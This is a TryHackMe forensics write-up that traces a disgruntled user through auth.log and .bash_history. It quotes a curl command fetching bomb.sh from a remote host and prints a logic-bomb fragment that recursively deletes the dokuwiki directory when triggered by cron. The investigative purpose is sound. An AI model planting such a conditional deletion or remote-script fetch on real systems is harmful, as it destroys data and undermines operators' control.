# Disgruntled
A TryHackMe box focusing on Linux forensics.

This box is created around the scenario of a disgruntled IT user conducting suspicious activity on the network. My job is to discover what they did and stop it. 

### 1. What commands did they run?

The user installed a package on the machine with elevated privledges. In order to find out what commands they ran I will be looking in the authentication logs or auth.log located in /var/log.

<p><span style="color:red"><em>cat auth.log | grep -i COMMAND</em></span></p>

The package they installed was named dokuwiki, which is an opensource wiki software written in PHP. The present owkring directory was /home/cybert. This user also created a user and a script file. This information can still be gathered by using the command above. 

```
User created - it-admin
Date sudo was given - Dec 28 06:27:34
Script file name - bomb.sh
```
To find more information on bomb.sh, I will be looking in the .bash_history file. The command used to created the file was curl 10.10.158.38:8080/bomb.sh --output bomb.sh. the file was then renamed and moved to the /bin folder as "os-update.sh". Fle contents below.  
```
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
fi
```
This file appears to delete service files if triggered. We can also see from the .bash_history, that the file was scheduled in crontab to go off at 08:00 as well.  
```
# History of marks within files (newest to oldest):

> /bin/os-update.sh
*16722089880
"60
root@ip-10-10-28-147:/home/it-admin# cat .bash_history 
whoami
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
ls
ls -la
cd ~/
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
ls
rm bomb.sh
sudo nano /etc/crontab
exit
root@ip-10-10-28-147:/home/it-admin# cd ../../et/crontab
-bash: cd: ../../et/crontab: No such file or directory
root@ip-10-10-28-147:/home/it-admin# cd ../../etc/crontab
-bash: cd: ../../etc/crontab: Not a directory
root@ip-10-10-28-147:/home/it-admin# cd ../..
root@ip-10-10-28-147:/# ls
```

After finding out all of that information we can succesfuly close the incident! 

TLDR : analyzed a machine to discover a disgruntled user downloaded a script that would delete all the files installed with a service if the use has not logged in to this machine in 30 days, a perfect example of a logic bomb. 

